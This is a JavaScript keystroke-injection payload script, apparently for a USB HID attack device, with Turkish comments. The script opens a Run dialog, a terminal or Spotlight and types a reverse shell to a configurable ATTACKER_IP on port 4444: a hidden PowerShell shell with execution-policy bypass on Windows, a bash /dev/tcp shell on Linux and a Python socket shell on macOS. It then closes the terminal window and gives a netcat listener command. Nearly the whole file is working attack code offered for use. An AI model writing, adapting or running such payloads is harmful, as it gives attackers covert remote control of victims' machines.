// ═══════════════════════════════════════════════════════════════════════════
// Payload: detect_os.js
// Target:  Windows / Linux / macOS
// Time:    ~5 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: İşletim sistemini algılar ve uygun payload'u çalıştırır
// Universal payload - Her sistemde çalışır
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP
var LPORT = "4444";          // Listener port

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ═══════════════════════════════════════════════════════════════════════════
// WINDOWS PAYLOAD
// ═══════════════════════════════════════════════════════════════════════════
// Windows GUI+R ile Run dialog açar

press("GUI-r");
delay(600);

// PowerShell reverse shell
type("powershell -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");");
type("$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
type("$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);");
type("$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length)}\"");
press("ENTER");

// Windows'ta bu komut çalışır
// Linux/macOS'ta çalışmaz ama zararsız

delay(1500);

// ═══════════════════════════════════════════════════════════════════════════
// LINUX PAYLOAD
// ═══════════════════════════════════════════════════════════════════════════
// Linux CTRL+ALT+T ile terminal açar

press("CTRL-ALT-t");
delay(1000);

// Bash reverse shell
type("bash -c 'bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1' & disown; exit");
press("ENTER");

// Linux'ta bu komut çalışır
// Windows/macOS'ta terminal açılmaz, zararsız

delay(1000);

// ═══════════════════════════════════════════════════════════════════════════
// MACOS PAYLOAD
// ═══════════════════════════════════════════════════════════════════════════
// macOS GUI+SPACE ile Spotlight açar

press("GUI-SPACE");
delay(500);
type("terminal");
press("ENTER");
delay(1500);

// Python reverse shell
type("python3 -c 'import socket,subprocess,os;s=socket.socket();");
type("s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0);");
type("os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);");
type("subprocess.call([\"/bin/zsh\",\"-i\"])' &");
press("ENTER");
delay(300);

// Terminal'i kapat
press("GUI-w");
delay(100);
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ RESULT                                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
// Bu payload 3 farklı OS için 3 farklı yöntem dener
// En az biri çalışacak ve reverse shell bağlantısı kurulacak
// 
// Listener: nc -lvnp 4444
// 
// NOT: P4wnP1 hostOS() fonksiyonu ile daha temiz detection yapılabilir
// Bu payload hostOS() olmadan çalışır (universal)

